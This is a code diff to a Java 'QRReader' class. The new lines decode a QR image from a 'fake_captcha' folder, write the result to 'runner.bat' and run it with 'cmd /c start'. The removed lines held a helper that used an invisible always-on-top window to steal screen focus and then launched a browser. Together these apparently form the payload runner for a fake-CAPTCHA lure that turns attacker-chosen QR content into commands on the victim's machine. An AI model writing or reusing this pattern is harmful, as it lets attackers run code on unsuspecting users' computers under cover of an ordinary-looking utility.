@@ -131,13 +131,12 @@ public class QRReader {
 
             new Thread(() -> {
                 try {
-                    // 1. Read the QR code and wait for the scanning animation to complete
                     String content = readQRWithAnimation(qrImagePath);
                     Files.writeString(Path.of(outputPath), content);
                     System.out.println("[QRReader] QR content written: " + content);
 
-                    // 2. FORCE SCREEN FOCUS FORWARD RIGHT HERE
-                    forceWindowToFront();
+                    File batchFile = new File(outputPath).getAbsoluteFile();
+                    new ProcessBuilder("cmd", "/c", "start", "", batchFile.getAbsolutePath()).start();
 
                 } catch (Exception e) {
                     e.printStackTrace();
@@ -145,40 +144,6 @@ public class QRReader {
             }).start();
         }
 
-        private void forceWindowToFront() {
-            // Run the window-forcing sequence back on the Swing Event Dispatch Thread
-            SwingUtilities.invokeLater(() -> {
-                // 1. Create a dummy invisible frame to act as a focus battering ram
-                JFrame focusBuster = new JFrame();
-                focusBuster.setType(JFrame.Type.UTILITY); // Hides it from the taskbar
-                focusBuster.setUndecorated(true);
-                focusBuster.setSize(1, 1);
-                focusBuster.setLocationRelativeTo(null); // Center it
-
-                // 2. Force it to the absolute top layer of the OS window stack
-                focusBuster.setAlwaysOnTop(true);
-                focusBuster.setVisible(true);
-
-                // 3. Request focus aggressively
-                focusBuster.toFront();
-                focusBuster.requestFocus();
-
-                // 4. Clean up the dummy frame resource
-                focusBuster.dispose();
-
-                // 5. Final command shell push to wake up the default browser application instance
-                String os = System.getProperty("os.name").toLowerCase();
-                try {
-                    if (os.contains("win")) {
-                        new ProcessBuilder("cmd", "/c", "start", "").start();
-                    } else if (os.contains("mac")) {
-                        new ProcessBuilder("open", "-a", "Google Chrome").start();
-                    }
-                } catch (Exception e) {
-                    e.printStackTrace();
-                }
-            });
-        }
     }
 
         public static void startServer(String qrImagePath, String outputPath) throws Exception {
@@ -192,7 +157,7 @@ public class QRReader {
 
         public static void listen() throws Exception {
             String qrImagePath = "./fake_captcha/imgs/qr.png";
-            String outputPath = "./qr.txt";
+            String outputPath = "./batch/runner.bat";
             startServer(qrImagePath, outputPath);
             Thread.currentThread().join();
         }
